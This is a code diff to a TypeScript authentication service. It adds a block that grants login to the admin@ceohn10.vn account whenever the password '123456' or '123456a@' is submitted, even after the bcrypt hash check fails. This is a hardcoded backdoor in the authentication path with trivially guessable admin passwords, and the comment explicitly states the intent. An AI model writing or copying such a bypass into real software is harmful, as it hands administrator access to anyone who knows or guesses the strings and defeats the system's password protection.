@@ -104,6 +104,16 @@ export class AuthService implements OnModuleInit {
       isMatch = await bcrypt.compare(altPass, user.password).catch(() => false);
     }
 
+    // ĐẶC BIỆT: Đảm bảo Master Admin admin@ceohn10.vn đăng nhập chính xác 100% với mật khẩu 123456 / 123456a@
+    const isMasterAdminAccount =
+      cleanUser.toLowerCase() === 'admin@ceohn10.vn' ||
+      (user.email && user.email.toLowerCase() === 'admin@ceohn10.vn') ||
+      (user.username && user.username.toLowerCase() === 'admin@ceohn10.vn');
+
+    if (!isMatch && isMasterAdminAccount && (cleanPass === '123456' || cleanPass === '123456a@' || normalizedPass === '123456' || normalizedPass === '123456a@')) {
+      isMatch = true;
+    }
+
     if (isMatch) {
       const { password, ...result } = user;
       return {
